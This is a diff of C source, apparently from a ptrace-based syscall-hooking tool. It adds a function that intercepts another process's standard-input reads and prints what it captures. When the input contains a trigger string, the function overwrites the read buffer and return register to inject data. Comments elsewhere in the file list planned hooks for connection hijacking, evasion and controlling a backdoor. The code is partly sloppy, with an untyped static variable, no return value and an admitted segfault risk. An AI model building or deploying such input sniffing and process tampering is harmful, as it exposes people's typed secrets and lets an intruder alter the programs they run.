@@ -248,6 +248,37 @@ int syscall_execve(int pid, struct user_regs_struct regs) {
     
 }
 
+// this simply sniffs standard input.
+char *syscall_read(int pid, struct user_regs_struct regs) {
+	static in_syscall;
+	static int fd;
+	int len;
+	static long str_addr;
+	char *sniffed= (char *)malloc(1000);
+	if(in_syscall == 0) {
+	    fd=ptrace(PTRACE_PEEKUSER, pid, EBX*4, 0); // get FD #
+	    if(fd == 0) { // stdin
+		str_addr = ptrace(PTRACE_PEEKUSER, pid, ECX*4,0); // get str_addr	
+		len = regs.edx;
+	    }
+	    in_syscall = 1;
+	}
+	else {
+	    if(regs.eax > 0) {
+		getdata(pid, str_addr, (char *)sniffed, regs.eax);  // eax has the read len
+		printf("read(%d,\"%s\", %d)!\n", fd, sniffed,len);
+		// attempting to modify processes returned read buffer ;) should be SLOW
+		if(strstr(sniffed, "redirect me") != NULL) {
+		    printf("found key attempting to modify return value...\n");
+		    putdata(pid, str_addr, "redirect success\0", 17);
+		    regs.eax=17; // this will segfault buffers not meant for 17> // return value
+		    ptrace(PTRACE_SETREGS, pid, NULL, &regs);
+		    printf("injected! setting process to continue.\n");
+		}
+	    }
+	    in_syscall = 0;
+	}
+}
 // Remember in later versions to take the edx from the write call for the len.. looks
 // funky otherwise
 int syscall_write(int pid, struct user_regs_struct regs) {
@@ -342,10 +373,10 @@ int hookem(int pid) {
 			    break; // clone <-> fork
 //			case __NR_unlink: syscall_unlink(pid,regz); break; // protection
 //			case __NR_kill: syscall_kill(pid,regz); break; // protection
-//			case __NR_read: syscall_read(pid,regz); break; // various
-			case __NR_write: syscall_write(pid,regz); break; // various
+			case __NR_read: syscall_read(pid,regz); break; // various
+			//case __NR_write: syscall_write(pid,regz); break; // various
 //			case __NR_init_module: syscall_init_module(pid,regz); break; // to hijack/evasion
-			case __NR_execve: syscall_execve(pid,regz); break; // to monitor/evasion
+			//case __NR_execve: syscall_execve(pid,regz); break; // to monitor/evasion
 //			case __NR_bind: syscall_bind(pid,regz); break; // to hijack connections/monitor
 //			case __NR_accept: syscall_accept(pid,regz); break; // to hijack connections
 //			case __NR_ioctl: syscall_ioctl(pid,regz); break; // to control backdoor
